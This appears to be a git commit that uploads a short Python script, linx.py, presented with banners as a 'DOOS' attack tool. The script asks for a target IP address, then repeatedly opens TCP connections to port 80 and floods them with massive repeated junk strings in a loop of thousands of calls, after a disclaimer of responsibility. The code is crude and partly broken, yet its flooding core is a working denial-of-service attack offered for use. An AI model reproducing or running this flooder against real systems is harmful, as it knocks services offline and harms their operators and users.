1a747f5faeb4aafb6157b602fabfa17860080ed4
SPID675 <132014072+SPID675@users.noreply.github.com>
2023-10-16 15:25:39 +0300

    Add files via upload

---
+++ linx.py
@@ -0,0 +1,32 @@
+
+from pystyle import *
+print(Box.Lines(" [+]TOLLS TRUB [+]"))
+Write.Print("[×] WARNING ⚠ L'M NOT RESPONSIBLE FOR ANYTHING YOU USE IN THE TOOL [×]\n",Colors.purple_to_red,interval=0.1)
+print(Box.Lines(" [+] DOOS UWP [+]"))
+import time 
+from socket import socket , AF_INET, SOCK_STREAM 
+def doss(ip_adress):
+    s = socket(AF_INET,SOCK_STREAM)
+    s.connect((ip_adress,80))
+    a = 0
+    d = 10
+    f = 15
+    h = 120
+    while a < f:
+     a =  a + 1 * f * d * h
+     array = [" usjzozhsoshdowhtqbicjcgskdidgsodhdkdhdkdydjdud bat"]
+     array = array * a * a 
+
+     for i in array:
+         i = str(i).encode("utf-8")
+         print(i)
+         s.send(i)
+         print("\n [ attack ]")
+ia = time.sleep(0.2)
+username = Write.Input  ("[⚠] IP_ADESS [⚠] \n",Colors.purple_to_red,interval=0.1)
+for i in range(10000):
+   doss(username)
+   doss(username)
+   doss(username)
+
+print(array *10)   
